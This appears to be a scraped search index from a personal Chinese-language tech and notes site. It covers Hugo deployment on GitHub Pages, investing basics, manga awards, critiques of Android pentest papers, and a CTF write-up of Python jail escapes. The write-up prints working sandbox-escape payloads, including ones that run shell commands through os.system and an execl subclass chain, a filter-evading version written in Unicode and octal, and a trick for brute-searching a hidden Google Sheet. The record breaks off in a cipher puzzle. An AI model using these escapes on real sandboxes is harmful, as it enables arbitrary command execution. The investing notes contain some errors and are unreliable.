on的意思是當main這個branches出現push的操作時，就要觸發這個workflow，也就是設定觸發條件的意思 jobs就是說明要做的事情，具體要看jobs.deploy.steps的內容 因為有使用到別人的themes，並且如果是使用submodule的方式加入到git的話，submodules這個property就要設定true，但如果是直接下載的話就要設定成false 因為我是使用peaceiris的workflow script所以uses就不用改，但hugo version就要改成latest的版本，不然會不過，像我的就是0.145.0 Build minify的意思是透過hugo把指定資源進行最小化處理 Deploy就是使用peaceiris/actions-gh-pages@v3這個版本的script，進行deploy，不用管具體在幹麻，需要注意的是，publish_dir是在./demo/public，因為hugo會把我寫的所有文章rendering之後放到./demo/public這個folder，所以我設定一個條件，如果main這個branch有變化，就把./demo/public這個folder中的所有內容，透過script更新到gh-pages 設定Github的一些東西 到自己設定的website repo首頁https://github.com/\u0026lt;username\u0026gt;/\u0026lt;username\u0026gt;.github.io，會看到上面有Actions和Setting兩個subpage 先到Setting \u0026gt; Pages 選擇Build and deployment中的選項為==GitHub Actions==，這個的意思是，因為Github在deploy類似Hugo這樣的靜態網頁框架時，如果選擇Deploy from a branch，那預設就會deploy Jekyll這個框架而不是Hugo導致deployment會失敗 如果在VScode的GitHub Actions Extension發現有另外一個workflow叫做pages build deployment那大機率就是這個地方沒有設定好，可以參考禁用Github pages build deployment\nPush to repo\n$ git add . $ git commit -m \u0026#34;Init Website\u0026#34; $ git push 丟上去到repo的時候可以透過vscode的GitHub Actions這個Extension查看有沒有deploy成功 有時候會出現像這樣deploy失敗的狀況，可以利用旁邊的View step logs查看具體哪邊出問題\n(最重要的地方)更改Source變成Deploy from a branch，並且把Branch改成如下圖 這邊的邏輯是:\n從 master (或 main) 分支的 Hugo 原始碼建置 (hugo --minify) 將建置結果 (./demo/public/) 部署到 gh-pages 分支 GitHub Pages再從gh-pages branch提供網站 之後Source就不需要再改回GitHub Actions了\n如果之後要跟新文章，就直接像一般的git push那樣固定的add-\u0026gt;commit-\u0026gt;push這樣的流程就可以了，GitHub Actions會自己把東西deploy到public pages\n"},{"id":512,"href":"/knowledge/%E6%8A%95%E8%B3%87%E7%90%86%E8%B2%A1/","title":"投資理財","section":"Knowledges","content":" 投資理財 # 基金 # 有主動和被動兩種，主要差別在於前者是利用投資客的錢再去投資，並且資產分配的很即時迅速，例如這個月的科技股看漲，那基金經理人就會多分配一點在科技股，而下個月可能多分配一點在民生相關的股票，積極程度是高的，ETF就是主動型基金；後者主要是一段時間之後，投資的資產配置才會更新。前者的優點是獲利較高(相對來說)但風險也較大，後者就相反\n期貨 # 就是跟別人借錢買標的，這樣自己出的錢就比較少，標的後續上漲後，獲利就會超乎想像的高，也就是類似開了槓桿，舉例來說，有一檔股票現值100元，我可以只用30元就買到，其他70元是銀行幫我出，如果之後這一檔股票漲到130元，我的獲利就是$(130-100)/30100%=100%$，但如果我不是用期貨的方式買，而是一個傳統的交易模式，獲利就會是$(130-100)/100100%=30%$，相比於利用期貨的方式會少非常多，但以上久只建立在後續上漲的情況，如果之後不幸跌了，那就代表要賠的錢也是超乎想像的多\n另外，期貨也有分兩種玩法，做多和做空，意思是我認為目前的標的會上漲那我就買做多，也就是假設標的有漲我就賺錢，相反如果我認為目前標的會下跌，那我就買做空，假設最後真的下跌了，那我也賺錢，就是買對於未來的預測，換言之，如果我買做空但最後上漲，那我就賠錢\n當沖 # 簡單說就是當天買當天賣，也就是短時間內，利用放大自己的本金達到高回報的方式，但需要大心臟，因為市場的變化太劇烈，在不對的時間賣出去，可能會損失很多。可能有人會想那我就只要投資那些長期不太會疊的標的就好啦，例如\n對沖 # 如果有一檔股票或基金我認為長期看漲(例如現在的0050)，所以我買進，但現在可能因為市場波動造成現階段下跌，但我又不想要把現有的資產賣出，要怎麼做才能不要損失呢?\n那就是利用對衝和期貨(或勸證、借券都可以)的做多做空的概念，具體來說，現階段0050持續下跌，那我可以買期貨的做空，並且控制兩者損益是一樣的，那如果最後0050真的下跌了，雖然原本手上的資產賠錢，但我的買的做空期貨是賺錢的，兩者損益為0，就可以很好的達到\u0026quot;對沖\u0026quot;的效果，讓原本只會賠錢的資產有凍結的效果。\n假設我認為目前標的看漲，我買期貨做多，而最後也真的上漲，那我就賺2倍，相反的 假設我認為目前標的看漲，我買期貨做多，但最後卻下跌了，那我就虧2倍，風險也是不小\n債券 \u0026amp; 國債 # 簡單來說就是發行者(可能是公司也可能是國家政府)像其他人借錢，之後再支付一定比例的利息，而該利息比我放定存還要高\n外幣匯率 # 其實就是賺匯差，如果我在去年買日幣，今年在賣出的話就可以賺匯差，因為今年日幣升值，例如2024/7的匯率是台幣:日幣=0.2:1，而現在2025/3的匯率是0.22:1，如果去年我買10000日圓的話那相當於2000台幣，而現在如果賣掉就是賺200元，獲利就是$(2200-2000)/2000*100%=10%$\n衍生性商品 # From GPT **衍生性金融商品（Derivatives）是一類金融工具，其價值來自於某種標的資產（Underlying Asset）**的價格變動。這些標的資產可以是股票、指數、外匯、大宗商品（如黃金、石油）、利率、甚至是比特幣等數位資產。\n🔹 衍生性商品的特點 # 價格來自標的資產：衍生性商品本身沒有內在價值，它的價格是由標的資產的市場價格變動決定的。 槓桿效果：通常可以用較少的資金控制更大的市場部位，但同時風險也較高。 可以用來避險或投機：許多投資者使用衍生性商品來對沖（Hedging）風險，或者進行高槓桿投機（Speculation）。 可做多也可做空：不像股票只能買進再賣出，衍生性商品通常允許投資者同時做多或做空市場。 🔹 常見的衍生性商品種類 # 期貨（Futures）\n合約約定在未來某個時間，以約定價格買入或賣出標的資產。 例如：原油期貨、黃金期貨、比特幣期貨。 選擇權（Options）\n給予買方在未來某個時間，以約定價格買入（買權，Call）或賣出（賣權，Put）標的資產的權利（但不強制執行）。 例如：台指選擇權、特斯拉股票選擇權。 差價合約（CFD, Contract for Difference）\n不需持有標的資產，只需根據價格變動來賺取價差，可做多或做空。 例如：CFD 外匯交易、CFD 黃金交易。 權證（Warrants）\n類似選擇權，但由發行公司（通常是銀行）提供，槓桿較大，交易方式較簡單。 例如：台灣股市的認購權證、認售權證。 互換（Swaps）\n兩方約定交換未來的現金流，例如利率互換（Interest Rate Swap）、貨幣互換（Currency Swap）。 例如：公司用來避險利率風險的利率互換合約。 🔹 衍生性商品的用途 # 避險（Hedging）\n例如航空公司購買石油期貨來對沖油價上漲的風險。 企業用利率互換來減少利率變動帶來的財務風險。 投機（Speculation）\n例如交易者利用槓桿進行期貨或選擇權交易，以小額資金博取高報酬。 套利（Arbitrage）\n透過市場價格的不一致，在不同市場買低賣高賺取無風險利潤。 🔹 風險與注意事項 # 槓桿風險：雖然槓桿可以放大獲利，但也會加大損失。 市場風險：標的資產價格波動劇烈，可能導致虧損。 流動性風險：部分衍生性商品流動性較差，可能難以快速買賣。 信用風險：部分 OTC（場外交易）的衍生性商品可能涉及交易對手違約的風險。 🔹 總結 # 衍生性金融商品是一種基於其他資產價格變動而衍生出來的金融工具，主要用於避險、投機和套利。雖然提供了高槓桿與靈活性，但同時也伴隨著較高的風險，適合熟悉市場運作並具備風險管理能力的投資者。\n"},{"id":513,"href":"/knowledge/%E6%97%A5%E6%9C%AC%E7%9F%A5%E5%90%8D%E7%9A%84%E6%BC%AB%E7%95%AB%E7%9B%B8%E9%97%9C%E7%8D%8E%E9%A0%85/","title":"日本知名的漫畫相關獎項","section":"Knowledges","content":" 日本知名的漫畫相關獎項 # From ChatGPT\n📖 綜合性漫畫大獎 # 1. 手塚治虫文化獎（手塚治虫文化賞） # 主辦單位：朝日新聞社 創立時間：1997年 特色：以「漫畫界的諾貝爾獎」著稱，表彰具有藝術性、創新性與影響力的作品。 主要獎項： 大獎 新生獎（表彰新銳漫畫家） 短篇獎（短篇或單冊完結作品） 特別獎（對漫畫界有貢獻者） 2. 文化廳媒體藝術祭漫畫部門（文化庁メディア芸術祭） # 主辦單位：日本文化廳 創立時間：1997年 特色：不僅表彰漫畫，也涵蓋動畫、遊戲、數位藝術等，著重於藝術性與創新性。 獎項類別： 大獎 優秀獎 新人獎 審查委員會推薦作品 3. 日本漫畫家協會獎（日本漫画家協会賞） # 主辦單位：日本漫畫家協會 創立時間：1972年 特色：由漫畫家組織評選，表彰對漫畫界有貢獻的作品。 主要獎項： 大獎（漫畫界最重要的榮譽之一） 優秀獎 特別獎 🏆 商業漫畫雜誌獎 # 4. 小學館漫畫獎（小学館漫画賞） # 主辦單位：小學館 創立時間：1955年 特色：針對大眾市場，獎勵受歡迎且有影響力的作品。 獎項類別： 兒童向類別 少年漫畫類別 少女漫畫類別 一般向類別 特別獎（不定期頒發） 5. 講談社漫畫獎（講談社漫画賞） # 主辦單位：講談社 創立時間：1977年 特色：涵蓋少年、少女及一般向漫畫，強調市場影響力與人氣。 獎項類別： 少年漫畫部門 少女漫畫部門 一般向漫畫部門 6. 集英社漫畫獎（手塚獎 \u0026amp; 赤塚獎） # 主辦單位：集英社（《週刊少年Jump》） 創立時間：1971年 特色：專為新人漫畫家設立，分為劇情漫畫與搞笑漫畫兩類。 獎項類別： 手塚獎（劇情漫畫類） 赤塚獎（搞笑漫畫類） 🔹 特定題材或類型獎 # 7. 星雲獎（星雲賞） # 主辦單位：日本科幻作家俱樂部 創立時間：1970年 特色：專門表彰優秀的 科幻類 漫畫、小說、動畫作品。 8. 這本漫畫真厲害！（このマンガがすごい！） # 主辦單位：寶島社 創立時間：2005年 特色：由漫畫愛好者、評論家評選，分為「男性向」與「女性向」榜單，專注於話題性與創新性。 9. 漫畫大獎（マンガ大賞） # 主辦單位：漫畫評論家團體 創立時間：2008年 特色：由漫畫編輯、書店店員選出的 純讀者口碑獎，不分少年、少女類型，強調新銳作品。 🔥 最新話題性漫畫獎 # 10. Next Manga Award（次にくるマンガ大賞） # 主辦單位：niconico \u0026amp; 《Da Vinci》雜誌 創立時間：2014年 特色：網友投票選出 最有潛力的未來熱門作品。 獎項類別： 紙本漫畫部門 網路漫畫部門 📌 總結 # 獎項名稱 創立年份 特色 手塚治虫文化獎 1997年 重視藝術性與影響力 文化廳媒體藝術祭 1997年 涵蓋漫畫、動畫、遊戲等多媒體 日本漫畫家協會獎 1972年 由漫畫家協會評選 小學館漫畫獎 1955年 針對大眾市場的作品 講談社漫畫獎 1977年 分少年、少女、一般向 集英社手塚 \u0026amp; 赤塚獎 1971年 專為新人漫畫家設立 星雲獎 1970年 科幻漫畫專門獎 這本漫畫真厲害！ 2005年 書店與評論家評選 漫畫大獎 2008年 書店推薦的高人氣新作 次にくるマンガ大賞 2014年 預測未來爆紅作品 這些獎項的影響力各有不同，像「手塚治虫文化獎」、「文化廳媒體藝術祭」偏向藝術性，而「這本漫畫真厲害！」與「次にくるマンガ大賞」則更注重話題性與市場趨勢。\n"},{"id":514,"href":"/tools/others/%E6%9C%89%E5%95%8F%E9%A1%8C%E7%9A%84%E7%B6%B2%E7%AB%99/","title":"有問題的網站","section":"Tools","content":" 有問題的網站 # 金讚城 http://www.ru.com.tw http://www.jzc.com.tw 華文網 https://www.book4u.com.tw/ "},{"id":515,"href":"/survey-papers/android-+-security/tool/%E6%9C%89%E9%97%9Cpentest%E4%BD%86%E8%B2%A2%E7%8D%BB%E5%BE%88%E7%88%9B%E7%9A%84%E4%B8%89%E7%AF%87%E8%AB%96%E6%96%87/","title":"有關Pentest但貢獻很爛的三篇論文","section":"Survey Papers","content":" Risk analysis and Android application penetration testing based on OWASP 2016 # :::info Borja, T., Benalcázar, M. E., Valdivieso Caraguay, Á. L., \u0026amp; Barona López, L. I. (2021). Risk analysis and Android application penetration testing based on OWASP 2016. In Information Technology and Systems: ICITS 2021, Volume 1 (pp. 461-478). Springer International Publishing. :::\nIntroduction # 嚴格來說，這一篇不是完全沒用，但真的貢獻超級低，他基本上就是照著之前寫過的1流程和動機甚至實驗方法做而已，最後再加上自己的一些見解(也就是所謂的風險評估矩陣和針對每一個Risk寫出自己的建議或是mitigation)，就這樣沒了，詳細對比如下 ![圖片](https://hackmd.io/_uploads/r1eR14KBA.png =400x) Reference 8就是1\nProposed Method # 作者自行創立一個Score Scale如下 總共有四個向度，前三個向度相加取平均後*最後一個向度就是該Risk的分數， 實驗後的級距分野如下 ![圖片](https://hackmd.io/_uploads/HJlAg4tBR.png =300x)\nExperiment # 按照類似1的方式分析每個OWASP公布的漏洞類別，就可以得到以下風險矩陣，並根據上述的計算方式得出風險的分數 最後自行提出一個漏洞分析以及建議的表格可自行查閱原文，對於研究不是那麼重要\nSecurity Analysis on Android Application Through Penetration Testing using Reverse Engineering # :::info Katoch, S., \u0026amp; Garg, V. (2023, March). Security Analysis on Android Application Through Penetration Testing using Reverse Engineering. In 2023 3rd International Conference on Smart Data Intelligence (ICSMDI) (pp. 216-222). IEEE. :::\nIntroduction # 這一篇就真的爛，根本是高中生寫出來交差的，他只傳達一個觀念，App Releases之前一定要做混淆，否則很容易被逆向，就這樣沒了\nBackground # 滲透測試通常分為四類之一：外部、內部、盲測(Blind)或雙盲測(Double Blind)\n外部測試重點在於公司可公開存取的伺服器和設備，例如防火牆、電子郵件伺服器、網域名稱伺服器 (DNS) 和 Web 伺服器 內部測試中，具有普通存取憑證的合法使用者模擬對防火牆的內部攻擊 盲測嚴重限制了預先提供給進行測試的個人或團隊以模仿真實攻擊者的活動和過程的資訊量。 雙盲測大大擴展了盲測，因為只有組織中選定的少數成員才會知道測試正在進行中。 Experiment # 他的實驗過於naive，他就是拿兩個App(其中一個以混淆)，丟到Jadx中進行decompile，然後看能不能夠分析出個所以然\nApp1 進行查找會發現API key被暴露出來 App2 可以看奧App2被decompile之後並沒有直接顯示code，而是出現MyWrapperProxyApplication這個class，這其實就是利用ProGuard進行混淆的結果 A Suggested Model for Mobile Application Penetration Test Framework # :::info ÖZGÜR, B., DOĞRU, İ. A., Göksel, U. Ç. T. U., \u0026amp; Alkan, M. (2021, December). A Suggested Model for Mobile Application Penetration Test Framework. In 2021 International Conference on Information Security and Cryptology (ISCTURKEY) (pp. 18-21). IEEE. :::\nIntroduction # 這一篇內容也是頗貧乏，主要就只是提出一個framework，講的多好有多好，但僅限在提出一個概念而已，我也知道把所有不同的工具整合起來可以打造出一個非常厲害的pentest framework，但只是提出概念沒有實作，貢獻度真的大打折扣\nProposed Framework # 下圖呈現了一個pentest可以做的所有事情 並且提出如果自動化的時候可以怎麼做，範例如下 最後，如果應用在App上會是什麼樣子 ![圖片](https://hackmd.io/_uploads/rkbRCEFB0.png =500x)\nReference # Alanda, A., Satria, D., Mooduto, H. A., \u0026amp; Kurniawan, B. (2020, May). Mobile application security penetration testing based on OWASP. In IOP Conference Series: Materials Science and Engineering (Vol. 846, No. 1, p. 012036). IOP Publishing.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":516,"href":"/security/competition/%E7%A5%9E%E7%9B%BE%E7%9B%832023%E5%88%9D%E8%B3%BD/","title":"神盾盃2023初賽","section":"Securities","content":" 神盾盃2023初賽 # Jail1 # Source code # while True: ip = input(\u0026#34;AEGIS\u0026gt; \u0026#34;) if \u0026#39;hint\u0026#39; in ip.lower(): print(__import__(\u0026#39;os\u0026#39;).system(\u0026#39;cat jail.py\u0026#39;)) exit() try: if \u0026#39;flag\u0026#39; in ip.lower(): print(\u0026#34;Sorry, I don\u0026#39;t like any \\\u0026#34;FLAG\\\u0026#34;!\u0026#34;) continue print(eval(ip)) except Exception as error: print(\u0026#34;ERROR:\u0026#34;, error) print(\u0026#34;Good luck next time!\u0026#34;) pass Recon # 應該是基本的jail escape，可以看到source code中擋掉了flag string，所以可以直接用萬用字元一樣畫葫蘆就拿到flag，水題中的水題\nExploit # $ echo \u0026#34;print(__import__(\u0026#39;os\u0026#39;).system(\u0026#39;cat fla*\u0026#39;))\u0026#34; | nc 35.234.20.42 8000 Flag: AEGIS{600d_j0b_70_byp455_fl46}\nJail2 # Background # SSTI\nSource Code # while True: ip = input(\u0026#34;AEGIS\u0026gt; \u0026#34;) if \u0026#39;hint\u0026#39; in ip.lower(): print(__import__(\u0026#39;os\u0026#39;).system(\u0026#39;cat jail.py\u0026#39;)) exit() try: print(eval(ip, {\u0026#34;__builtins__\u0026#34;: {}}, {\u0026#34;__builtins__\u0026#34;: {}})) except Exception as error: print(\u0026#34;ERROR:\u0026#34;, error) print(\u0026#34;Good luck next time!\u0026#34;) pass Recon # 也是水題，既然block掉__builtins__ function，代表我們沒辦法使用print之類的function，但和前面的邏輯一樣，自己import就好\nExploit - SSTI # $ echo \u0026#34;().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__[\u0026#39;execl\u0026#39;](\u0026#39;/bin/cat\u0026#39;, \u0026#39;cat\u0026#39;, \u0026#39;./flag.t xt\u0026#39;)\u0026#34; | nc 35.201.222.158 8000 Flag: AEGIS{und3rl1n3\\_c4n\\_d0\\_4\\_l07_7h1n65}\nJail3 # Background # the pepsi place\nSource Code # while True: ip = input(\u0026#34;AEGIS\u0026gt; \u0026#34;) if \u0026#39;hint\u0026#39; in ip: print(__import__(\u0026#39;os\u0026#39;).system(\u0026#39;cat jail.py\u0026#39;)) exit() try: if any (i in \u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39; for i in ip): print(\u0026#34;I don\u0026#39;t like any \\\u0026#34;LETTER\\\u0026#34;!\u0026#34;) continue print(eval(ip, {\u0026#34;__builtins__\u0026#34;: {}}, {\u0026#34;__builtins__\u0026#34;: {}})) except Exception as error: print(\u0026#34;ERROR:\u0026#34;, error) print(\u0026#34;Good luck next time!\u0026#34;) pass Recon # 這一題承接上一題，不只block __builtins__ function，更不能輸入任何ascii letters，所以沒有解出來，我在想有沒有類似jsfuck的東西可以scramble python code或是一些magic method是不需要字母的\nExploit - 賽後解 # 賽後有跟其他隊伍交流一下這一題，用的方法其實就是換個encoding或是字形，實際的手法也是採用原本的SSTI，而前半段的方式有點像是splitline寫的Domain Obfuscator，把一些常見的字元換掉，在trytry看本地端可不可以過，我是採用和提供payload的朋朋一樣的字形(可以參考這個網站)$\\to$().__𝖈𝖑𝖆𝖘𝖘__.__𝖇𝖆𝖘𝖊𝖘__[0].__𝖘𝖚𝖇𝖈𝖑𝖆𝖘𝖘𝖊𝖘__()[127].__𝖎𝖓𝖎𝖙__.__𝖌𝖑𝖔𝖇𝖆𝖑𝖘__ 但後面的部分就沒辦法用相同的辦法構造，不過python也支援用八進制表示ascii，所以轉換一下就可以拿到flag\n$ echo FLAG{test_123} \u0026gt; flag.txt $ echo \u0026#34;().__𝖈𝖑𝖆𝖘𝖘__.__𝖇𝖆𝖘𝖊𝖘__[0].__𝖘𝖚𝖇𝖈𝖑𝖆𝖘𝖘𝖊𝖘__()[127].__𝖎𝖓𝖎𝖙__.__𝖌𝖑𝖔𝖇𝖆𝖑𝖘__[\u0026#39;\\145\\170\\145\\143\\154\u0026#39;](\u0026#39;/\\142\\151\\156/\\143\\141\\164\u0026#39;, \u0026#39;\\143\\141\\164\u0026#39;, \u0026#39;./\\146\\154\\141\\147.\\164\\170\\164\u0026#39;)\u0026#34; | python jail.py AEGIS\u0026gt; FLAG{test_123} Hidden Sheet # Recon # 這一題只有給兩個google sheet，但仔細看會發現其中一個worklist(也就是flag)是被隱藏的我們看不到也不能切換過去，應該是沒有開放權限的關係，所以我們可以直接用一些功能確認其中的內容為何\nExploit # 利用google spreadsheat的 尋找與取代功能 爆搜隱藏的sheet 「flag」，AEGIS{xx…x}，{ 在E1，} 在AJ1，接著就慢慢報搜\nFlag: AEGIS{G00gl3_5h33t5_15_v3Ry_p0Pul4r}\nPeko # Attached Files # :::spoiler message\nPekOpekOPEKOPEkoPEKOPeKOPEKOpEkoPekOPeKoPEKOPEkO PEKOpeKOPEKOPEkOPEKOpekoPEKOpeKoPekOpEKo PEKOPEKOPekOPeKoPEKOpEkoPEKOpEkO PekOpEKOPEKOpeKOPEKOPEko PEKOPekoPEKOPEkOPekOpEKOPEKOpekoPEKOpEkoPEKOPeko PEKOpEkoPEKOPEKO PekOpekOPEKOPEkoPEKOPeKOPEKOpEkoPEKOpeKoPEKOPEkOPEKOPekoPEKOpEKO, PekOPekOPEKOpeKOPEKOPEkoPekOPeKoPEKOPEko PekOpEKoPEKOpeKOPEKOPEko PEKOpEKoPEKOpeKoPEKOPEkOPEKOpekoPEKOpEkOPekOpEKo PekOpEKoPEKOpeKOPEKOPEko PEKOpekoPekOpEKo PEKOPEkO PEKOpEkOPEKOPEkoPEKOpEkOPEKOPeKoPEKOPEkoPekOPeKo PEKOpEkoPEKOPEKO PekOPeKoPEKOpEkoPekOpekoPEKOPEkOPEKOpeKoPekOpEKOPekOpeko. PekOPekOPEKOpeKOPEKOpekoPEKOpeKoPEKOPEko PEKOPekoPEKOpEkoPekOpEKO PEKOpEkOPekOPEkoPEKOpEKoPEKOpeKO PEKOpekoPekOpEKo PEKOpEKoPekOPEkoPekOPeKoPekOPeKoPEKOPEkoPEKOPekoPekOpEKOPEKOpeKoPekOpeko PEKOPeKOPEKOPekoPEKOpEkoPekOPekOPEKOPeko PEKOPEkOPEKOPeKoPEKOpEkoPekOPEkoPekOpEKO PekOpekOPEKOPEkoPEKOPeKOPEKOpEkoPEKOpeKoPEKOPEkOPEKOPekoPEKOpEKO, PEKOpekoPekOpEKO PEKOpekoPekOpEKo PEKOPEkOPekOpEKoPekOpEKoPekOPEkoPEKOpEkOPEKOPEkoPEKOpEKO PekOpEKOPEKOpeKOPEKOPEkOPekOpEKO PEKOpekoPekOpEKOPekOpEKo PEKOpEKOPEKOPEkoPEKOPekoPEKOpekoPekOPEKoPEKOPEkoPEKOPekoPekOpEKo PEKOPEkOPekOPeKoPEKOPEko, PEKOpeKoPEKOpekoPEKOPeKOPEKOPEko PekOpekOPEKOPEkoPEKOPeKOPEKOpEkoPekOPeKoPEKOPEkO, PEKOPEkOPEKOPekoPEKOpekoPEKOpEkOPEKOPEkOPEKOpeKoPekOpEKo PEKOpeKOPekOPEkoPEKOpEkOPEKOPEkOPEKOPekoPekOpEKo PekOPekOPEKOpekoPekOpEKOPEKOpeKO PekOPeKoPEKOPEkOPEKOPeKoPEKOPeKoPEKOpekoPekOpEKO-PEKOPEkoPEKOPEkOPekOPeKoPekOpEKo PEKOPEkOPEKOPekoPEKOpEKO PEKOpEKoPEKOpEkoPEKOpEkOPekOpekOPEKOPEkOPekOPeKoPEKOPEkOPekOpEKOPEKOpekoPekOPEKOPEKOPEkoPEKOpeKoPekOpeko PEKOpeKoPEKOpEkoPEKOPekoPEKOPekO PEKOpeKoPEKOpekoPEKOPEKOPEKOPEkoPekOpEKoPekOpekOPEKOPEkOPEKOPekoPekOpEKo, PEKOPEkOPEKOPekoPEKOpEKO PekOpEKOPEKOpeKOPEKOPEkOPekOpEKO PekOpEKOPEKOpeKOPEKOPEko PekOPeKoPEKOPEkOPEKOPeKoPEKOPeKoPEKOpekoPekOpEKO-PEKOpEkOPEKOpEkoPekOpEKOPEKOpekoPEKOPEKO PEKOPEkOPekOpekOPekOpekOPEKOPEkOPekOPeKoPEKOPEkoPEKOPekoPekOpEKO PEKOpekoPEKOPeko PekOpekOPEKOPEkoPEKOPeKOPEKOpEkoPekOPeKoPEKOPEkO\u0026#39;PekOpEKo PEKOPEKOPEKOPEkOPekOpEKoPEKOpeKOPEKOpekoPEKOpEkoPEKOPeko PEKOPEkOPEKOPekoPEKOpEKO PEKOPEkOPEKOpEKoPEKOpEKoPEKOPEkoPekOpEKoPekOpEKoPEKOpEkoPekOPeKoPEKOpekoPEKOPEkoPekOpEKo PEKOpekoPekOpEKo PekOpEKoPEKOpekoPEKOPekOPEKOPekoPEKOpekoPEKOPEKOPEKOpekoPEKOpEKoPEKOPEkOPEKOPekoPekOpEKO PekOpEKOPEKOpEko PekOpEKOPEKOpeKOPEKOPEkoPEKOpekoPekOPeKo PEKOpEKoPekOPEkoPEKOpeKoPekOpEKOPekOPEkoPekOPeKoPEKOPEko. PEKOPEkOPEKOpEKoPEKOpEKoPEKOpEkoPekOPeKoPEKOpEKOPEKOpekoPEKOPekoPEKOPekO PekOpEKOPEKOpEko PekOpekOPEKOPEkoPEKOPeKOPEKOpEkoPekOPeKoPEKOPEkO, \u0026#34;PekOpekOPEKOPEkoPEKOPeKOPEKOpEko\u0026#34; PEKOpekoPekOpEKo PekOpEKOPEKOpeKOPEKOPEko PEKOpEkoPEKOPekoPEKOpeKoPekOpeko PekOPekOPEKOpEkoPekOPeKoPEKOpEKO PEKOpekoPEKOPeko PekOpEKOPEKOpeKOPEKOPEko PekOpekOPEKOPEkoPEKOPeKOPEKOpEkoPEKOpeKoPEKOPEkOPEKOPekoPEKOpEKOPEKOpekoPekOpEKoPEKOpeKO PEKOpeKoPEKOPEkOPEKOPekoPEKOPekOPekOPEkoPEKOPEkOPEKOPekOPEKOPEko. PEKOpekoPEKOPeko-PEKOpeKoPEKOpekoPEKOPekoPEKOPEko PekOPekOPEKOpekoPekOpEKOPEKOpeKO PEKOpeKOPEKOPEkoPekOPeKo PEKOpEKoPEKOpeKoPEKOPEkOPEKOpekoPEKOpEkOPekOpEKo PEKOpEkoPEKOPEKO PEKOPEkO PekOPeKoPEKOpEkoPekOpekoPEKOPEkOPEKOpeKo PekOPEkoPekOpekOPEKOPeKoPekOPeKoPEKOpekoPEKOPekoPEKOPekOPEKOpekoPEKOPekoPEKOPekO, PekOpekOPEKOPEkoPEKOPeKOPEKOpEkoPekOPeKoPEKOPEkO\u0026#39;PekOpEKo PekOpekOPEKOPEkoPekOPeKoPekOpEKoPEKOpEkoPEKOPekoPEKOPEkOPEKOpeKoPEKOpekoPekOpEKOPekOpeko PEKOpEKoPEKOPEkOPEKOPeko PEKOPeKoPEKOPEko PEKOpEKOPEKOPEkoPekOpEKoPEKOpEKoPekOPeKoPEKOpekoPEKOPeKoPEKOPEkoPEKOpEKO PEKOPEkOPekOpEKo PEKOpEkoPekOPEkoPekOpEKOPekOPekOPEKOPEkOPekOPeKoPEKOpEKOPEKOpeKoPekOpeko PEKOPeKoPekOPeKoPEKOPEkOPekOpEKOPekOpEKOPekOpeko, PEKOpeKOPEKOPEkOPekOPEkoPEKOPekOPEKOpeKOPekOpEKOPekOpeko, PEKOpekoPEKOpEkOPEKOpEkOPEKOPEkOPekOpEKOPekOPEkoPekOPeKoPEKOPEko PEKOPEkOPEKOPekoPEKOpEKO PekOpEKoPekOPEkoPekOPeKoPEKOpeKoPekOpeko, PEKOPeKoPekOPEkoPekOpEKO PEKOPekOPEKOPEkoPEKOPekoPekOPEkoPEKOpekoPEKOPekoPEKOPEkoPEKOpeKoPekOpeko PekOpekOPEKOpeKoPEKOPEkOPekOpekoPEKOPEKOPekOPEkoPEKOpeKo PEKOPEkOPEKOPekoPEKOpEKO PEKOPEKOPekOPeKoPEKOpekoPEKOPEkoPEKOPekoPEKOpEKOPEKOpeKoPekOpeko. PEKOPeKoPekOPEkoPekOpEKO PekOPekOPEKOpeKOPEKOPEkoPEKOPeko PEKOPekoPEKOpEkoPekOpEKO PEKOpEkoPEKOPeko PEKOpEKoPEKOPEkOPEKOpEkOPEKOPEkoPekOPeKoPEKOPEkO PekOpEKoPEKOpeKOPEKOPEko PEKOpeKOPEKOPEkOPekOpEKo PEKOPeKoPEKOPEkoPEKOPEkoPEKOPeko PEKOPekoPEKOpEkoPekOpEKOPEKOPEkoPEKOpEKO PEKOPeKoPekOpeko PEKOpEkoPekOpEKOPEKOpeKOPEKOPEkoPekOPeKo PEKOpeKOPEKOpEkoPEKOpeKoPEKOpEkoPEKOpeKoPEKOpekoPekOPEKOPEKOPEko PEKOPekOPEKOpekoPekOPeKoPEKOpeKoPekOpEKo PEKOPEkOPekOpEKo PekOpekOPEKOpEkoPEKOpeKoPEKOpekoPekOpEKOPEKOPEko PEKOPEkOPEKOPekoPEKOpEKO PekOpEKoPEKOpeKOPekOpeko PekOpEKOPEKOpEko PEKOPEkOPekOpEKo PekOpEKoPEKOpeKOPEKOPEko PEKOpEKOPEKOpEkoPEKOPEkoPekOpEKoPEKOPeko\u0026#39;PekOpEKO PEKOpeKoPEKOpekoPEKOPeKOPEKOPEko PekOpekOPEKOPEkoPEKOpEkoPekOpekOPEKOpeKoPEKOPEko PEKOpekoPEKOPeko PEKOpeKOPEKOPEkoPekOPeKo PekOpEKoPekOpekOPEKOPEkOPEKOpEKoPEKOPEko, PEKOPEkOPekOpEKo PekOPekOPEKOPEkoPEKOpeKoPEKOpeKo PEKOPEkOPekOpEKo PEKOpEkoPEKOPekoPEKOPEko PekOpEKOPEKOpEko PEKOpekoPEKOPekoPekOpEKOPEKOPEkoPekOPeKoPEKOPekoPEKOPEkOPEKOpeKoPEKOpekoPekOPEKoPEKOPEko PEKOpeKOPEKOPEkoPekOPeKo PekOpekOPEKOPEkOPEKOpekoPEKOPeko (PEKOPEkOPekOpEKo PEKOPekoPEKOpEkoPekOpEKOPEKOPEkoPEKOpEKO PEKOPeKoPekOpeko PEKOpeKOPEKOpEkoPekOPEkoPekOpEKoPEKOpeKOPEKOpEkoPekOPEko PEKOpEkOPEKOPEkOPekOPeKoPEKOpekoPEKOPekoPEKOPEko) PekOPekOPEKOpeKOPEKOpekoPEKOpEKoPEKOpeKO PEKOPEkoPEKOPekoPEKOpEKOPEKOPEkoPEKOpEKO PekOPEkoPekOpekO PekOpekOPekOPeKoPEKOPEkoPEKOpEkOPEKOPEkOPekOpEKOPekOPEkoPekOPeKoPEKOPEkoPEKOpeKoPekOpeko PEKOPEkoPEKOPekoPEKOpEKOPEKOpekoPEKOPekoPEKOPekO PEKOpEkoPEKOPekoPEKOPEko PEKOpEkoPEKOPEKO PEKOpeKOPEKOPEkoPekOPeKo 